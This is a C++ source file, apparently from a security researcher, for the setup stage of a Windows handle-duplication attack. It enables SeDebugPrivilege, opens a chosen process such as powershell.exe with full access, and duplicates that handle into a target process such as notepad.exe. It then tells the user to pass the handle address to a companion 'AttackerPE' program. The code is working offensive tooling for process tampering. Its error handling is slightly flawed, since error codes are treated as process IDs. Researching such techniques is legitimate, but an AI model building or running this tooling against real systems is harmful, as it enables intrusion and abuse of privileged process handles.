/*

Researcher & developer: Mehrshad Mollaafzal
Github: "https://github.com/mehrshadmollaafzal"
Twitter: "https://x.com/Mehrshad_13_"
Linkedin: "https://www.linkedin.com/in/mehrshad-mollaafzal/"

*/

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <Dbghelp.h>
#include <intrin.h>
#include <iostream>

int Error(const char* msg) {
    DWORD error_value = GetLastError();
    printf_s("[-] Error %s %d\n", msg, error_value);
    return 1;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    BOOL success = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                success = TRUE;
            }
        }
        CloseHandle(hToken);
    }

    return success;
}



DWORD GetPIDByName(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return Error("CreateToolhelp32Snapshot");
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return Error("Process32Next");
    }

    do {
        if (processName == pe32.szExeFile) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));
    printf_s("[-] Process not found\n");

    CloseHandle(hSnapshot);
    return Error("2-Process32Next");
}

int main() {
    HANDLE hTargetHandle;

    std::wcout << L"Enter the Process name that you want get Handle (like powershell.exe): ";
    std::wstring procNameHandle;
    std::wcin >> procNameHandle;

    std::wcout << L"Enter the target Process name (like notepad.exe): ";
    std::wstring targetProcName;
    std::wcin >> targetProcName;

    if (EnableDebugPrivilege()) {
        printf("[+] SeDebugPrivilege enabled successfully.\n");
    }
    else {
        return Error("EnableDebugPrivilege");
    }

    DWORD PidHandle = GetPIDByName(procNameHandle);     // Get PID of powershell.exe
    if (PidHandle != 1)
        printf_s("[+] PID of %ws %d\n", procNameHandle.c_str(), PidHandle);
    HANDLE needDupHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PidHandle);  // Get handle from powershell.exe

    DWORD PidTarget = GetPIDByName(targetProcName);
    HANDLE TargerProcessHandle = OpenProcess(GENERIC_ALL, FALSE, PidTarget);

    if (needDupHandle != NULL) {
        printf_s("[+] Handle of %ws is OK\n", procNameHandle.c_str());
        if (!DuplicateHandle(GetCurrentProcess(), needDupHandle, TargerProcessHandle, &hTargetHandle, PROCESS_QUERY_INFORMATION, FALSE, DUPLICATE_SAME_ACCESS)) {
            return Error("[-] Error DuplicateHandle ");
        }
        printf_s("[*] Run Process Explorer and find handles of %ws then find a handle named %ws\n", targetProcName.c_str(), procNameHandle.c_str());
        printf_s("and write address of handle in AttackerPE code...\n");
        printf_s("[*] Sleep(INFINITE) After running AttackerPE.exe for exit this code press Ctrl+C\n");
        Sleep(INFINITE);
    }
    else {
        return Error("needDupHandle ");
    }
}